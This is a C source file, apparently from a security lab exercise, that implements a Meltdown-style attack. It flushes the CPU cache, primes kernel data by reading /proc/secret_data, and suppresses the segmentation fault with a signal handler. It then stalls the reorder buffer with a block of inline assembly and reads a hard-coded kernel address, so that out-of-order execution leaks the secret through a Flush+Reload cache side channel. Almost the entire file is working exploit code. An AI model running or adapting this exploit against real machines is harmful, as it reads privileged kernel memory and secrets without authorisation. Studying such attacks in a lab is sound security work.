#include <stdio.h>
#include <signal.h>
#include <setjmp.h>
#include "FlushReload.h"
#include <sys/stat.h>
#include <fcntl.h>

static sigjmp_buf bufjump;

static void catch_sigsegv()
{
  siglongjmp(bufjump, 1);
}

void attack(unsigned long kernel_secret_addr)
{
  /*Optimization: dereference null pointer */
  *(volatile char *)0;
  /*Optimization: stall RoB with ALU EU*/
  asm volatile(
      ".rept 400;"
      "add $0x141, %%eax;"
      ".endr;"

      :
      :
      : "eax");
  char kernel_secret;
  kernel_secret = *(char *)kernel_secret_addr;
  victim(kernel_secret);
}

int main(int argc, const char **argv)
{

  flushCache();

  /*Optimization:  Put data in cache */
  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0)
  {
    perror("open");
    return -1;
  }

  int ret = pread(fd, NULL, 0, 0);
  signal(SIGSEGV, catch_sigsegv);

  if (sigsetjmp(bufjump, 1) == 0)
  {
    attack(0xf8791000);
  }
  else
  {
    printf("Secret stored in cache due to ooo. By catching the error we can now leak the cache from the CPU.\n");
  }

  reloadCache();
  return 0;
}
